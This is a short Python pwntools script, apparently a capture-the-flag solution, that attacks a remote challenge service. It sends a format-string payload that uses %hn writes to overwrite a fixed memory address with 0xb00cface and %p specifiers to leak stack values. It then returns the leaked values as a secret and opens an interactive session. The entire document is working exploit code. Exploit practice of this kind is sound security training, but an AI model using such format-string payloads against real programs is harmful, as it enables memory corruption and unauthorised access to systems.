from pwn import *

r = remote("csie.ctf.tw", 10129)

a = 0x6012ac

# flag1
# b00c face
payload = "%45068c%22$hn%19138c%23$hnABC%8$p.%9$pABC".ljust(0x30, '\x00') + p64(a) + p64(a+2)
r.sendline(payload)

# flag2
r.recvuntil("ABC0x")
secret = p64(int(r.recvuntil(".0x")[:-3], 16)) + p64(int(r.recvuntil("ABC")[:-3], 16))
r.recv()
r.send(secret)

r.interactive()
